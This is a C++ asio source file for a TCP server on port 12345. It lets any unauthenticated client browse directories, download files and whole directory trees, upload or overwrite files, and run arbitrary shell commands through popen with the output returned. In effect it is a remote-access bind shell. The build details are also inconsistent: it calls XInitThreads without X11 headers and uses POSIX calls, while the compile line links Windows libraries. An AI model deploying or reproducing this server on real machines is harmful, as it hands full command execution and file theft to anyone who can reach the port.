#include <iostream>
#include <print>
#include <ranges>
#include <filesystem>
#include <fstream>
#include <asio.hpp>
#include <asio/experimental/awaitable_operators.hpp>

using namespace asio::experimental::awaitable_operators;
namespace fs = std::filesystem;

struct client_state {
    fs::path current_directory = fs::current_path();
};

asio::awaitable<void> curr_path(asio::ip::tcp::socket& socket, const client_state& state) {
    co_await asio::async_write(socket, asio::buffer(state.current_directory.u8string() + u8"\n\n"), asio::use_awaitable);
}

asio::awaitable<void> directory_listing(asio::ip::tcp::socket& socket, const client_state& state) {
    std::u8string listing;
    std::error_code error;
    for (const fs::directory_entry& entry : fs::directory_iterator(state.current_directory, error)) {
        if (error) {
            listing += u8"<ERROR>\t" + entry.path().filename().u8string() + u8"\n";
            error.clear();
            continue;
        }
        if (fs::is_directory(entry, error)) {
            listing += u8"<DIR>\t" + entry.path().filename().u8string() + u8"\n";
        } else if (fs::is_regular_file(entry, error)) {
            listing += u8"\t" + entry.path().filename().u8string() + u8"\n";
        }
    }
    listing += u8"\n";
    co_await asio::async_write(socket, asio::buffer(listing), asio::use_awaitable);
}

asio::awaitable<void> change_directory(asio::ip::tcp::socket& socket, const std::string& directory, client_state& state) {
    fs::path new_dir = state.current_directory / directory;
    std::error_code ec;
    if (fs::exists(new_dir, ec) && fs::is_directory(new_dir, ec)) {
        state.current_directory = fs::canonical(new_dir); // Resolve to absolute path
        co_await asio::async_write(socket, asio::buffer("\n"), asio::use_awaitable);
    } else {
        co_await asio::async_write(socket, asio::buffer("[-] Invalid directory!\n\n"), asio::use_awaitable);
    }
}

asio::awaitable<void> send_file(asio::ip::tcp::socket& socket, const std::string& file_name, const client_state& state) {
    fs::path file_path = state.current_directory / file_name;
    std::ifstream source(file_path, std::ios::binary);
    if (!source) {
        std::size_t file_size = 0; 
        co_await asio::async_write(socket, asio::buffer(&file_size, sizeof(file_size)), asio::use_awaitable);
        co_return;
    }
    std::size_t file_size = fs::file_size(file_path);
    co_await asio::async_write(socket, asio::buffer(&file_size, sizeof(file_size)), asio::use_awaitable);
    std::vector<char> buffer(8192); // 8KB chunks
    while (!source.eof()) {
        source.read(buffer.data(), buffer.size());
        std::size_t bytes_read = source.gcount();
        if (bytes_read > 0) {
            co_await asio::async_write(socket, asio::buffer(buffer.data(), bytes_read), asio::use_awaitable);
        }
    }
}

asio::awaitable<void> receive_file(asio::ip::tcp::socket& socket, const std::string& file_arg, const client_state& state) {
    asio::error_code error;
    bool replace = false;
    std::string file_name;
    if (file_arg.starts_with("-r ")) {
        replace = true;
        file_name = file_arg.substr(3);
    } else {
        file_name = file_arg;
    }

    fs::path file_path = state.current_directory / file_name;

    if (fs::exists(file_path) && !replace) {
        co_await asio::async_write(socket, asio::buffer("[-] File exists! Use `-r` flag to replace.\n\n"), asio::use_awaitable);
        co_return;
    }

    co_await asio::async_write(socket, asio::buffer("\n\n"), asio::use_awaitable);

    std::size_t file_size = 0;
    auto [ec, bytes_read] = co_await asio::async_read(socket, asio::buffer(&file_size, sizeof(file_size)), as_tuple(asio::use_awaitable));

    if (ec || bytes_read != sizeof(file_size)) {
        co_return;
    }
    if (file_size == 0) 
        co_return;


    std::ofstream destination(file_path, std::ios::binary);
    if (!destination) {
        co_return;
    }

    std::vector<char> buffer(8192); // 8KB chunks
    std::size_t received = 0;
    while (received < file_size) {
        std::size_t bytes_to_read = std::min(buffer.size(), file_size - received);
        auto [read_ec, bytes_read] = co_await asio::async_read(socket, asio::buffer(buffer, bytes_to_read), as_tuple(asio::use_awaitable));
        if (read_ec) {
            break;
        }
        destination.write(buffer.data(), bytes_read);
        received += bytes_read;
    }

    if (received < file_size) {
        destination.close();
        fs::remove(file_path); 
    }
}

asio::awaitable<void> send_string(asio::ip::tcp::socket& socket, const std::u8string& str) {
    std::size_t size = str.size();
    co_await asio::async_write(socket, asio::buffer(&size, sizeof(size)), asio::use_awaitable);
    co_await asio::async_write(socket, asio::buffer(str), asio::use_awaitable);
}

asio::awaitable<void> send_directory(asio::ip::tcp::socket& socket, fs::path&& dir_path, const client_state& state) {
    dir_path = state.current_directory / dir_path;

    size_t dir_size = 0;
    for (const fs::directory_entry& entry : fs::recursive_directory_iterator(dir_path)) {
        if (entry.is_regular_file()) {
            dir_size += fs::file_size(entry.path());
        }
    }

    co_await asio::async_write(socket, asio::buffer(&dir_size, sizeof(dir_size)), asio::use_awaitable);

    for (const fs::directory_entry& entry : fs::recursive_directory_iterator(dir_path)) {
        std::u8string rel_path = fs::relative(entry.path(), dir_path).u8string();
        if (entry.is_directory()) {
            char type = 'D';
            co_await asio::async_write(socket, asio::buffer(&type, sizeof(type)), asio::use_awaitable);
            co_await send_string(socket, rel_path); 
        } else if (entry.is_regular_file()) {
            char type = 'F'; 
            co_await asio::async_write(socket, asio::buffer(&type, sizeof(type)), asio::use_awaitable);
            co_await send_string(socket, rel_path);
            co_await send_file(socket, entry.path(), state); 
        }
    }

    char end_signal = 'E';
    co_await asio::async_write(socket, asio::buffer(&end_signal, sizeof(end_signal)), asio::use_awaitable);
}

asio::awaitable<void> execute_command(asio::ip::tcp::socket& socket, const std::string& cmd) {
    std::string cmd_output;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        cmd_output = "[-] Failed to execute command\n";
    } else {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe.get()) != nullptr) {
            cmd_output += buffer;
        }
    }
    if (cmd_output.empty()) {
        cmd_output = "[+] Command executed with no output\n";
    }
    std::size_t output_size = cmd_output.size();
    co_await asio::async_write(socket, asio::buffer(&output_size, sizeof(output_size)), asio::use_awaitable);
    co_await asio::async_write(socket, asio::buffer(cmd_output), asio::use_awaitable);
}

asio::awaitable<void> process_command(asio::ip::tcp::socket& socket, const std::string& command, client_state& state) {
    if (command == "ls") {
        co_await directory_listing(socket, state);
    } else if (command == "pwd") {
        co_await curr_path(socket, state);
    } else if (command.starts_with("cd ")) {
        std::string directory = command.substr(3);
        co_await change_directory(socket, directory, state);
    } else if (command.starts_with("download ")) {
        std::string file_name = command.substr(9);
        co_await send_file(socket, file_name, state);
    } else if (command.starts_with("upload ")) {
        std::string file_name = command.substr(7);
        co_await receive_file(socket, file_name, state);
    } else if (command.starts_with("cmd ")) {
        std::string cmd = command.substr(4);
        co_await execute_command(socket, cmd);
    } else if (command.starts_with("get ")) {
        std::string dir = command.substr(4);
        co_await send_directory(socket, dir, state);
    } else {
        co_await asio::async_write(socket, asio::buffer("[-] Invalid command!\n\n"), asio::use_awaitable);
    }
}

asio::awaitable<void> handle_client(asio::ip::tcp::socket socket) {
    try {
        client_state state;
        asio::streambuf response;
        for (;;) {
            auto [ec, bytes_transferred] = co_await asio::async_read_until(
                socket, response, '\n', as_tuple(asio::use_awaitable));
                
            if (ec || bytes_transferred == 0) {
                break; 
            }

            std::istream response_stream(&response);
            std::string command;
            std::getline(response_stream, command);

            co_await process_command(socket, command, state); 
        }
    } catch (const std::exception& e) {
        std::cerr << "[-] Client handler exception: " << e.what() << "\n";
    }
}

asio::awaitable<void> accept_connections(asio::ip::tcp::acceptor& acceptor) {
    for (;;) {
        auto [ec, socket] = co_await acceptor.async_accept(as_tuple(asio::use_awaitable));
        if (!ec) {
            asio::co_spawn(acceptor.get_executor(), handle_client(std::move(socket)), asio::detached);
        } else {
            std::cerr << "[-] Accept error: " << ec.message() << "\n";
        }
    }
}

int32_t main() {
    XInitThreads();
    asio::io_context io_context;
    asio::ip::tcp::acceptor acceptor(io_context, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 12345));
    asio::co_spawn(io_context, accept_connections(acceptor), asio::detached);
    io_context.run();
}
//clang++ -Wall -Wextra -Wpedantic -Wconversion -fsanitize=address server.cpp -o server -std=c++23 -lws2_32 -lgdi32
